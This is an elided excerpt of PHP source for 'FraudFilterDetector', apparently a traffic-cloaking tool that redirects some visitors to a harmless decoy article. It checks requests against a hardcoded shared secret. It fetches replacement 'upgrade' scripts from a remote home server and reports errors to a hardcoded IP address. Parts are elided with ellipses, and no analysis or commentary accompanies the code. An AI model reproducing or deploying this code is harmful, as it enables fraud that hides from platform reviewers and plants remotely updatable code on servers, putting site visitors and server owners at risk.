...
class FraudFilterDetector_5sb6b {
    ...
    function isSignatureValid($sign, $time) {
        $str = '9b7cf936-30ef-4588-92d7-172d2caac659.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('http://listverse.com/2018/05/26/10-strange-facts-about-historical-figures');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 9b7cf936-30ef-4588-92d7-172d2caac659',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 9b7cf936-30ef-4588-92d7-172d2caac659';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 9b7cf936-30ef-4588-92d7-172d2caac659';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=5sb6b&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_5sb6b = new FraudFilterDetector_5sb6b();
$fraudFilterDetector_5sb6b->check();
